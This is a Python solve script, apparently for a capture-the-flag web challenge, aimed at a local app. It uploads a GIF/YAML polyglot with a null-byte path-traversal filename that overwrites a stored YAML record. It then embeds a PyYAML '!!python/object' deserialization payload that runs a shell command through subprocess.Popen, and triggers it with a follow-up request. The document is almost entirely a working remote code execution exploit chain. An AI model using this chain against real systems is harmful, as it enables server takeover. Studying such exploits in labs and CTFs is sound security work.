# Solve script for the simpler solution
import requests
import subprocess
import yaml

def to_slug(name: str):
    return name.lower().replace(' ', '-')

# Change to your target!
TARGET_URL = 'http://127.0.0.1:24014/'

FRIEND_NAME = 'hecker'
TARGET_FILENAME = f'../data/{to_slug(FRIEND_NAME)}.yaml\0.png'

DUMP_FP = yaml.dump(TARGET_FILENAME).rstrip('\n')

FRIEND_YAML = (
f'''!!python/object:models.Friend
friends: !!set {{}}
name: {FRIEND_NAME}
photos:
- !!python/object:models.Photo
  exif: {{}}
  fp: {DUMP_FP}
'''
)

# Sample RCE payload
class Payload:
    def __reduce__(self):
        return (subprocess.Popen,('ls',))

# GIF file payload: Generated with pixload: https://github.com/sighook/pixload
PAYLOAD_HEADER = b'GIF87a/* \x00\x80\x00\x00\x04\x02\x04\x00\x00\x00,\x00\x00\x00\x00 \x00 \x00\x00\x02\x1e\x84\x8f\xa9\xcb\xed\x0f\xa3\x9c\xb4\xda\x8b\xb3\xde\xbc\xfb\x0f\x86\xe2H\x96\xe6\x89\xa6\xea\xca\xb6\xee\x0b\x9b\x05\x00;*/=1;'
# Payload object as an attribute of person
assert((len(FRIEND_YAML)-len(PAYLOAD_HEADER)) >= 0)
PAYLOAD = PAYLOAD_HEADER+b" "*(len(FRIEND_YAML)-len(PAYLOAD_HEADER))+b'p: '+yaml.dump(Payload()).encode()

if __name__ == '__main__':
    response = requests.post(
        TARGET_URL,
        data = {
            'full_name': FRIEND_NAME,
        },
        files = {
            'photos': (TARGET_FILENAME, PAYLOAD),
        },
    )
    assert(response.status_code == 200)
    requests.get(TARGET_URL+'friends/'+to_slug(FRIEND_NAME))
